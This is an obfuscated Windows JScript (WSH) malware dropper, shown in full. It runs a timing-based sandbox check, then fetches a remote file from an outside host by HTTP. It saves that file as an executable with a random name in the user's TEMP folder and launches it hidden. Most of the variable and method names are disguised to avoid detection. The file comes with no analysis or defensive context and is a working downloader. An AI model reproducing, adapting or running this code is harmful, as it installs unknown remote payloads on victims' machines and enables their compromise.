var eG = false;
var D = "CreateObject";
var u0 = function k() {return WScript[D]("WScript.Shell");}(), VY = 11;
var td = "MSXML2.XMLHTTP";
var C = 2123213;
var Bw = 0;
function nM(HZ){u0["Run"](HZ, Bw, Bw);};
function Vt(){return "" + td;};
function n(GU, v){Bw = Bw * 1; return GU - v;};
function pa(){return D;};
/*@cc_on
  @if (@_win32 || @_win64)
    eG = true;
  @end
@*/
if (eG)
{
var dq = "";
function z(){return 22;};
var FG = 0; var oB = 0;
function Ca()
{
var Jg = new this["Date"]();
var g = Jg["getUTCMilliseconds"]();
WScript["Sleep"](z());
var Jg = new this["Date"]();
var u = Jg["getUTCMilliseconds"]();
WScript["Sleep"](z());
var Jg = new this["Date"]();
var w = Jg["getUTCMilliseconds"]();
var FG = "Rj";
FG = n(u, g);
var oB = "L";
oB = n(w, u);
dq = "open";
return n(FG, oB);
}
var g0 = false;
var Tv = false;
for (var S = Bw; S < z() * 1; S++){if (Ca() != Bw){
g0 = true; 
oB = "31" + 11 * FG + oB; 
Tv = true; 
break;
}}
function bd() {return ((g0 == true) && (g0 == Tv)) ? 1 : Bw;};
if (g0 && bd() && Tv){
function j() {return u0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "uagF96Gnfu0EJTGZ.exe";};
 k0 = Vt();
 H = WScript[D](k0);
 var OM = 1;
 while (OM){
try {
H[dq]("GET", "http://digimacro.com.br/m8isda", false);
H["send"]();
ja = "Sleep";
for (;;){WScript[ja](z() * 11); if (H["readystate"] >= 2 * 2) break;};
OM = Bw;
} catch(C0){};
}
function rG(JV) {var D0 = (1, 2, 3, 4, 5, JV); return D0;};
A = WScript[pa()]("ADODB.Stream");
k0 = A;
k0[dq]();
k0["type"] = rG(1);
k0["write"](H["ResponseBody"]);
A["position"] = rG(Bw);
k0["Save" + "ToFile"](j(), 2);
A["c"+"lose"]();
Cj = j();
nM(Cj);
}
}

